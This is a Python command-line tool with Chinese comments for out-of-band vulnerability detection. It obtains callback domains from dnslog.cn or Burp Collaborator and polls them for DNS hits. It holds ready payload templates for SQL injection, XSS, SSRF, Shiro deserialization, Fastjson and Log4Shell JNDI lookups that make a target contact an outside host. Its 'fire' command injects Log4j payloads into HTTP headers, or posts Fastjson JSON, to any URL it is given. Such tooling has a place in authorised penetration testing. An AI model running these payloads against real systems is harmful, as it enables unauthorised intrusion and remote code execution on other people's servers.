#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
DNSLog 一键工具 —— 常驻可复用
后端1: dnslog.cn (免费, 脚本自动拿域+轮询, 默认)
后端2: Burp Collaborator (主链路, 通过 MCP 拿域, 工具负责记录/轮询提示)

用法:
  python dnslog.py get                 # 拿新域名(dnslog.cn) / 输出Collaborator提示
  python dnslog.py get --backend collab  # Collaborator 模式(需先用 MCP 生成)
  python dnslog.py poll                 # 查最近一次的回连记录
  python dnslog.py watch --timeout 120  # 拿域并轮询等回连(直到有记录或超时)
  python dnslog.py list                 # 历史域名与回连
  python dnslog.py clear                # 清空历史
"""
import sys, os, json, time, datetime, argparse, uuid

# 兼容 Windows 终端编码
try:
    sys.stdout.reconfigure(encoding="utf-8", errors="replace")
    sys.stderr.reconfigure(encoding="utf-8", errors="replace")
except Exception:
    pass

import requests
requests.packages.urllib3.disable_warnings()

BASE = os.path.dirname(os.path.abspath(__file__))
HIST = os.path.join(BASE, "history.json")
UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120 Safari/537.36"

def load_hist():
    if os.path.exists(HIST):
        try: return json.load(open(HIST, encoding="utf-8"))
        except: return []
    return []

def save_hist(h):
    json.dump(h, open(HIST, "w", encoding="utf-8"), ensure_ascii=False, indent=1)

def now():
    return datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")

# ---------- dnslog.cn 后端 ----------
class DnslogCN:
    URL = "http://www.dnslog.cn"
    def __init__(self):
        self.s = requests.Session()
        self.s.headers.update({"User-Agent": UA})
        self.s.cookies.set("PHPSESSID", uuid.uuid4().hex)
    def get_domain(self):
        r = self.s.get(self.URL + "/getdomain.php", timeout=10, verify=False)
        r.raise_for_status()
        d = r.text.strip()
        return d
    def get_records(self):
        r = self.s.get(self.URL + "/getrecords.php", timeout=10, verify=False)
        r.raise_for_status()
        try: return r.json()
        except: return []

# ---------- 主流程 ----------
def cmd_get(backend):
    h = load_hist()
    if backend == "dnslog":
        d = DnslogCN()
        dom = d.get_domain()
        # 保存 cookie 以便后续 poll —— dnslog.cn 用 PHPSESSID 关联, 但子域与记录绑定在本进程 session
        print(f"[+] 新域名: {dom}")
        print(f"[+] 记录查询: python dnslog.py poll")
        h.append({"domain": dom, "backend": "dnslog", "time": now(),
                  "records": d.get_records()})
        save_hist(h)
        # 记住当前 session cookie 供 poll 复用
        json.dump({"phpsessid": d.s.cookies.get("PHPSESSID")},
                  open(os.path.join(BASE, "session.json"), "w"))
    else:
        print("[+] Collaborator 模式: 用 MCP 生成域名后手动登记")
        print("    mcp__burp__generate_collaborator_payload  → 拿 xxx.burpcollaborator.net")
        dom = input("    粘贴 Collaborator 域名: ").strip()
        h.append({"domain": dom, "backend": "collab", "time": now(), "records": []})
        save_hist(h)
        print(f"[+] 已登记: {dom}")

def cmd_poll():
    h = load_hist()
    if not h:
        print("[-] 无历史, 先 python dnslog.py get"); return
    last = h[-1]
    print(f"[*] 最近域名: {last['domain']}  ({last['backend']}, {last['time']})")
    if last["backend"] == "dnslog":
        # 用保存的 PHPSESSID 重建 session 查询
        try:
            sess = json.load(open(os.path.join(BASE, "session.json")))
            s = requests.Session(); s.headers.update({"User-Agent": UA})
            s.cookies.set("PHPSESSID", sess["phpsessid"])
            r = s.get(DnslogCN.URL + "/getrecords.php", timeout=10, verify=False)
            recs = r.json()
        except Exception as e:
            recs = []; print(f"[-] 查询异常: {e}")
    else:
        print("[*] Collaborator: 用 mcp__burp__get_collaborator_interactions 查回连")
        return
    print(f"[{'!'.ljust(3)}] 回连记录 {len(recs)} 条:")
    for x in recs:
        print(f"    {x}")
    last["records"] = recs
    save_hist(h)

def cmd_watch(timeout):
    dom = None
    h = load_hist()
    if h: dom = h[-1]["domain"]
    if not dom:
        print("[-] 无历史, 先 get 拿域"); return
    print(f"[*] 域名: {dom}  轮询 {timeout}s 等回连...")
    s = requests.Session(); s.headers.update({"User-Agent": UA})
    sess = json.load(open(os.path.join(BASE, "session.json")))
    s.cookies.set("PHPSESSID", sess["phpsessid"])
    t0 = time.time()
    while time.time() - t0 < timeout:
        try:
            recs = s.get(DnslogCN.URL + "/getrecords.php", timeout=8, verify=False).json()
        except: recs = []
        if recs:
            print(f"[+] 命中! {len(recs)} 条回连:")
            for x in recs: print(f"    {x}")
            return
        time.sleep(3)
    print("[-] 超时无回连")

# ---------- 场景 payload 模板（<子域> 自动填充） ----------
PAYLOADS = {
    "ping":     "ping {D}",
    "sqli":     "load_file(concat('\\\\\\\\',(select version()),'.{D}\\\\x'))",
    "xss":      "<script src=//{D}></script>",
    "ssrf":     "http://{D}:80",
    "shiro":    "java -jar ysoserial.jar URLDNS \"http://{D}\" > poc.ser → AES-CBC加密 → Cookie: rememberMe=<密文>",
    "fastjson": '{"@type":"java.net.Inet4Address","val":"{D}"}',
    "fastjson6": '{"@type":"java.net.Inet6Address","val":"{D}"}',
    "log4j":    "${jndi:ldap://{D}}  或  ${jndi:dns://{D}}",
    "log4jver": "${jndi:ldap://${sys:java.version}.{D}}",
}

def build_payload(ptype, dom):
    tpl = PAYLOADS.get(ptype)
    if not tpl:
        print(f"[-] 未知类型 {ptype}, 可选: {', '.join(PAYLOADS.keys())}"); sys.exit(1)
    return tpl.replace("{D}", dom)

def cmd_probe(ptype, watch):
    # 1. 拿新域
    d = DnslogCN()
    dom = d.get_domain()
    json.dump({"phpsessid": d.s.cookies.get("PHPSESSID")},
              open(os.path.join(BASE, "session.json"), "w"))
    h = load_hist()
    h.append({"domain": dom, "backend": "dnslog", "time": now(), "records": []})
    save_hist(h)
    print(f"[+] 地址: {dom}")
    # 2. 构造 payload
    payload = build_payload(ptype, dom)
    print(f"[+] 场景[{ptype}] payload:")
    for line in payload.split("\n"):
        print(f"    {line}")
    print(f"[*] 把 payload 发给目标后，回连自动出现在下面:")
    # 3. 自动轮询
    s = requests.Session(); s.headers.update({"User-Agent": UA})
    s.cookies.set("PHPSESSID", d.s.cookies.get("PHPSESSID"))
    t0 = time.time()
    while time.time() - t0 < watch:
        try: recs = s.get(DnslogCN.URL + "/getrecords.php", timeout=8, verify=False).json()
        except: recs = []
        if recs:
            print(f"[+] 命中! {len(recs)} 条回连:")
            for x in recs: print(f"    {x}")
            return
        time.sleep(3)
    print(f"[-] {watch}s 无回连")

def cmd_fire(ptype, target, data, watch):
    """主动注入: 拿域 → 构造payload → 发到目标 → 自动盯回连"""
    d = DnslogCN()
    dom = d.get_domain()
    json.dump({"phpsessid": d.s.cookies.get("PHPSESSID")},
              open(os.path.join(BASE, "session.json"), "w"))
    h = load_hist()
    h.append({"domain": dom, "backend": "dnslog", "time": now(), "records": []})
    save_hist(h)
    print(f"[+] 地址: {dom}")
    payload = build_payload(ptype, dom)
    # log4j 模板含中文「或」注释, header 注入时提取第一个 ${...} 纯变体(latin-1 可编码)
    if ptype in ("log4j", "log4jver"):
        import re as _re
        m = _re.search(r'\$\{[^\}]+\}', payload)
        if m: payload = m.group(0)
    print(f"[+] 场景[{ptype}] payload: {payload}")
    print(f"[*] 注入目标: {target}")
    try:
        if ptype in ("log4j", "log4jver"):
            hdrs = {"User-Agent": UA,
                    "X-Api-Version": payload,
                    "X-Forwarded-For": payload,
                    "Referer": "http://" + dom + "/"}
            r = requests.get(target, headers=hdrs, timeout=15, verify=False)
            print(f"[+] 已注入 ({r.status_code}) → Header: X-Api-Version/X-Forwarded-For/Referer")
        elif ptype in ("fastjson", "fastjson6"):
            body = (data or '{"k":"{D}"}').replace("{D}", payload.replace("\\", "\\\\").replace('"', '\\"'))
            r = requests.post(target, data=body.encode("utf-8"),
                              headers={"User-Agent": UA, "Content-Type": "application/json"},
                              timeout=15, verify=False)
            print(f"[+] 已注入 ({r.status_code}) → POST JSON: {body}")
        else:
            print("[-] fire 仅支持 fastjson/fastjson6/log4j/log4jver"); return
    except Exception as e:
        print(f"[-] 注入失败: {e}"); return
    if watch <= 0:
        print("[*] 注入完成, 稍后用 python dnslog.py poll 查回连")
        return
    print(f"[*] 轮询 {watch}s 等回连...")
    s = requests.Session(); s.headers.update({"User-Agent": UA})
    s.cookies.set("PHPSESSID", d.s.cookies.get("PHPSESSID"))
    t0 = time.time()
    while time.time() - t0 < watch:
        try: recs = s.get(DnslogCN.URL + "/getrecords.php", timeout=8, verify=False).json()
        except: recs = []
        if recs:
            print(f"[+] 命中! {len(recs)} 条回连:")
            for x in recs: print(f"    {x}")
            return
        time.sleep(3)
    print(f"[-] {watch}s 无回连")

def cmd_list():
    h = load_hist()
    for i, x in enumerate(h):
        print(f"{i+1}. [{x['backend']}] {x['domain']}  {x['time']}  回连{len(x.get('records',[]))}条")

def cmd_clear():
    if os.path.exists(HIST): os.remove(HIST)
    if os.path.exists(os.path.join(BASE, "session.json")): os.remove(os.path.join(BASE, "session.json"))
    print("[+] 已清空")

def main():
    ap = argparse.ArgumentParser(prog="dnslog", description="DNSLog 一键工具")
    sub = ap.add_subparsers(dest="cmd")
    g = sub.add_parser("get"); g.add_argument("--backend", default="dnslog", choices=["dnslog", "collab"])
    sub.add_parser("poll")
    w = sub.add_parser("watch"); w.add_argument("--timeout", type=int, default=120)
    p = sub.add_parser("probe")
    p.add_argument("--type", default="ping", choices=list(PAYLOADS.keys()), help="payload 场景")
    p.add_argument("--watch", type=int, default=0, help="自动轮询秒数(0=只构造不盯)")
    f = sub.add_parser("fire")
    f.add_argument("--type", default="log4j", choices=["fastjson", "fastjson6", "log4j", "log4jver"], help="注入场景")
    f.add_argument("--target", required=True, help="目标 URL")
    f.add_argument("--data", default=None, help="fastjson POST JSON 模板(用 {D} 占位 payload, 默认 {\"k\":\"{D}\"})")
    f.add_argument("--watch", type=int, default=60, help="自动轮询秒数(0=只注入不盯)")
    sub.add_parser("list"); sub.add_parser("clear")
    a = ap.parse_args()
    if a.cmd == "get": cmd_get(a.backend)
    elif a.cmd == "poll": cmd_poll()
    elif a.cmd == "watch": cmd_watch(a.timeout)
    elif a.cmd == "probe": cmd_probe(a.type, a.watch)
    elif a.cmd == "fire": cmd_fire(a.type, a.target, a.data, a.watch)
    elif a.cmd == "list": cmd_list()
    elif a.cmd == "clear": cmd_clear()
    else: ap.print_help()

if __name__ == "__main__":
    main()
